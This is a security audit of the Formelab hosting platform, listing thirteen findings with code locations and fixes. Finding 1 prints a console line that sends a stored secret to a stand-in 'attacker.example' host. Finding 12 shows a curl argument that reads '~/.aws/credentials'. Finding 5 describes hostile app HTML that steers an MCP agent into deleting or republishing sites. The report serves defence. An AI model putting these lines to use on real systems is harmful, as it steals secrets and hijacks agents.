# Formelab security audit

Date: 2026-10-13 · Scope: everything in this repository at `4da43b0` (Worker source in `src/`,
migrations, `wrangler.toml`, `scripts/`, the dashboard, the SDK and the MCP/OAuth layer).
Method: a manual read of every source file, then exploit tests run against the Worker in the
project's own `vitest-pool-workers` harness. Findings marked **Confirmed** were reproduced that way.
`npm audit --omit=dev` reported 0 known vulnerabilities, and git history contains no committed credentials.

## Summary

| # | Severity | Finding | Status |
|---|---|---|---|
| 1 | **Critical** | Any viewer of an app can send its secrets to a server they control through the secret proxy | **Fixed** |
| 2 | **High** | All apps in a namespace share one origin, so apps aren't isolated from each other (restricted apps included) | Confirmed |
| 3 | **High** | App KV has no write permissions: any viewer can read, overwrite, wipe or fill an app's data | Confirmed |
| 4 | Medium | Untrusted app code is served from the same registrable domain as the dashboard and OAuth | Design |
| 5 | Medium | Indirect prompt injection: the MCP `fetch` tool gives other people's HTML to an agent that can also delete and publish | Design |
| 6 | Medium | Removing someone from Access doesn't cut off their deploy tokens or OAuth grants (up to 30 days) | Documented |
| 7 | Low | Proxy response redaction is easy to bypass | Confirmed |
| 8 | Low | Any viewer can use up an app's proxy rate limit and fill the unbounded audit table | Code read |
| 9 | Low | `GET /_api/kv` returns up to about 64 MB in one response | Code read |
| 10 | Low | Site editors (not owners) can make a restricted app public; namespace editors can delete the owner's apps | Design |
| 11 | Low | Anyone can claim any free namespace name first | Design |
| 12 | Low | `scripts/publish.sh` passes `--title` and `--allowed-emails` to `curl -F`, so a value starting with `@` uploads a local file | Code read |
| 13 | Info | `is_admin` is never revoked; it's currently cosmetic | Code read |

---

## 1. Critical: secret exfiltration through the proxy

> **Fixed:** secrets now carry a required `hosts` allow-list (migration `0010`), and the proxy
> refuses any other host. Secrets saved before the fix are refused until they are set again.

**Where:** `src/runtime.ts:90-101`, `src/secrets.ts:240-296`

The proxy only requires `canViewSite`. For any app with `visibility: "all"` (the default), that
means every person allowed through Cloudflare Access. The caller chooses the URL and headers. The
SSRF guard only blocks private and platform hosts, so a viewer can send the secret to any public
host they like:

```js
// Run from the browser console on any app you can view
formelab.secrets.proxy("openai_key", { url: "https://attacker.example/c?k={{value}}" })
```

Redaction only cleans the response coming back to the browser. The attacker's server has already
received the secret in plaintext. Confirmed: the outbound request contained the full secret,
sent by a user with no role on the site.

**Fix:** bind each secret to its allowed hosts. The owner sets them with the secret (for example
`{ value, hosts: ["api.openai.com"] }`, stored in the encrypted blob or a new column). `proxy()`
then rejects any final URL whose hostname isn't on that list. Also consider:
- refusing placeholders in the scheme, host or port part of the URL;
- a per-secret switch for whether non-editors can use it at all.

## 2. High: no isolation between apps in a namespace

**Where:** `src/index.ts:76-94`, `src/runtime.ts:27-39`

Every app in a namespace is served from `https://<ns>.DOMAIN`. The runtime API picks the target
app from the `x-formelab-mount` header, which page JavaScript sets freely. As a result, JS in
`/public-app/` running in a visitor's browser can:

- `fetch("/private-app/")` and read a **restricted** sibling app's files whenever the visitor can see it;
- call `/_api/*` with `x-formelab-mount: /private-app/` to read and write its KV and list its secrets;
- use the sibling's secrets via the proxy, which combined with #1 leaks them to the attacker;
- if the visitor manages the sibling app, `PUT`/`DELETE` its secrets.

The `Origin` check doesn't help because the request is same-origin. Confirmed.

Who can do this: anyone who can put JS on any app in the namespace. That includes namespace
editors, editors of just one site, and any XSS or malicious third-party script in any app.

**Fix:** give each app its own origin (for example `<site>--<ns>.DOMAIN`, or one subdomain per site
ID), and resolve the runtime site from the host rather than a header. Short of that, document
clearly that "restricted" isn't a boundary between apps in the same namespace.

## 3. High: KV is world-writable for viewers

**Where:** `src/runtime.ts:59-66`

Reading, writing and deleting KV all need only view access. Confirmed: a user with no role read
every key of another owner's app, overwrote one, and deleted it. The same user can also write
1,000 junk keys, after which the app's real writes fail with `too_many_keys`.

**Fix:** split permissions. For example: reads for viewers; writes only for managers, or only
under a key prefix tied to the user (`user:<email>/...`); an opt-in "shared writable" flag per app.
At minimum, document that KV is shared, public and editable by every viewer.

## 4. Medium: user content is same-site with the control plane

App HTML, SVG and JS from any user is served with no CSP from `*.formelab.ai`. The dashboard,
`/authorize` and the admin API live at `formelab.ai`. These count as **same-site**, so:
- an app can set cookies scoped to `Domain=formelab.ai` (cookie tossing);
- `SameSite` cookies are sent on requests between them.

The existing defenses (Origin check, `x-formelab-request`, `__Host-` OAuth cookies) cover the
obvious attacks. Even so, the standard practice is to serve user content from a separate
registrable domain (for example `formelab.app`), the way github.io and googleusercontent.com do.
That change would also make #2 easier to fix.

## 5. Medium: indirect prompt injection via MCP

**Where:** `src/mcp.ts:193-232`

`fetch` returns up to 200 KB of any viewable app's `index.html`. Site IDs are visible to
everyone through `list_sites({namespace})`. The same token also carries `publish`, `update_site`
and `delete_site`, because there is one `mcp` scope. An attacker can publish a public app whose
HTML tells the agent to "delete the site X" or "republish Y with this script", then get a victim
to ask their assistant about it.

**Fix:**
- add a read-only scope, and grant write tools only with a separate scope;
- label fetched source as untrusted content in the tool result;
- consider requiring the caller to confirm `delete_site` by repeating its mount path.

## 6. Medium: offboarding gap

**Where:** `src/oauth.ts:46-58`, `src/auth.ts:116-128`

`/mcp` and `/_api/deploy/*` bypass Access. They only check that the user's row exists, and rows
are never deleted. A person removed from the Access policy keeps working deploy tokens and OAuth
grants for up to 30 days. `DECISIONS.md` already lists this as a known limitation.

**Fix:**
- add an admin-only "disable user" that sets a flag, checked in `getUser`/`userForDeployToken`, and revokes all of the user's tokens and grants;
- or shorten the refresh-token lifetime (`refreshTokenTTL`) and require a recent Access login at refresh.

## 7. Low: redaction is easy to bypass

**Where:** `src/secrets.ts:169-173`

Redaction only matches the exact value, and only values of 6+ characters. Confirmed: an upstream
that base64-encodes the echoed header returns the secret intact. URL-encoding or splitting the
value works too. Treat redaction as best-effort; the real control is #1's host allow-list.

## 8. Low: proxy and audit abuse

The proxy rate limit is per site (`src/secrets.ts:179`). Any viewer can use up the 60/min and
block the app's real users. Each proxy call also writes an audit row, and the `audit` table is
never pruned. **Fix:** also rate-limit per viewer per site, and add a retention job for `audit`.

## 9. Low: unbounded KV list

**Where:** `src/kv.ts:15-22`

`kvList` loads, parses and re-serializes every row: up to 1,000 × 64 KB. That gets close to the
Worker's 128 MB memory limit. **Fix:** paginate (`limit` + cursor) or cap the total bytes.

## 10. Low: permission edges

- `updateSite` and `publishSite` let **site editors** change `visibility` and `allowed_emails`. A
  co-editor can make a restricted app public or add themselves to its allow-list.
- **Namespace editors** can delete and replace the namespace owner's apps.

If that isn't intended, limit visibility/allow-list changes and deletes to owners.

## 11. Low: namespace squatting

Namespaces are claimed first-come by any Access user. Only six names are reserved
(`src/sites.ts:48`). Someone could claim `login`, `sso`, `hr`, `payroll` or a colleague's name and
host a convincing look-alike page. **Fix:** a larger reserved list, or admin approval for new
namespaces.

## 12. Low: `curl -F` file read in `scripts/publish.sh`

**Where:** `scripts/publish.sh:57-61`

With `-F "title=${title}"`, a value starting with `@` or `<` makes curl read a local file. For
example, `--title @~/.aws/credentials` puts the file's contents into a published title. This
matters when an agent passes in untrusted text. **Fix:** use `--form-string` for `title`,
`allowed_emails`, `namespace`, `mount_path` and `visibility`.

## 13. Info: sticky admin flag

`upsertUser` uses `MAX(users.is_admin, excluded.is_admin)` (`src/auth.ts:65`), so changing
`OWNER_EMAIL` never removes the old admin. Today `isAdmin` is only shown in the UI. If it ever
grants privileges, compute it from `OWNER_EMAIL` on every request instead.

---

## What's done well

- All SQL is parameterized. The only dynamic SQL (`updateSite`) builds column names from a fixed list.
- The zip parser is careful: symlinks, `..` paths, ZIP64, encryption and reserved paths are all
  rejected, and decompression is checked against a running size budget, so zip bombs are stopped early.
- The SSRF guard is solid, with IPv4/IPv6 private, mapped, NAT64 and 6to4 forms blocked, plus
  `global_fetch_strictly_public`, manual redirects and the check running after substitution.
- Access JWTs are verified properly: RS256 only, `aud`/`iss`/`exp` checked, and the plain email
  header is never trusted. The dev bypass requires an exact `ENVIRONMENT === "dev"`.
- Deploy tokens are stored only as SHA-256 hashes, are 256-bit random, expire, and can't mint more tokens.
- Secrets use AES-256-GCM with a random IV and AAD bound to `site_id:name`.
- The admin API has CSRF protection (Origin check plus a custom header). The dashboard has a strict
  CSP with `frame-ancestors 'none'`, and output is escaped everywhere.
- The OAuth consent page uses browser-bound `__Host-` cookies, can't be framed, and has a tight `form-action`.
- No dependency CVEs, and no secrets in git history.

## Suggested order of work

1. #1: host allow-lists for secrets. This is small and closes the critical issue.
2. #3: KV write permissions.
3. #2 and #4 together: per-app origins on a separate user-content domain.
4. #6: user disable and revoke-all.
5. #5: read-only MCP scope.
6. The low findings as cleanup.
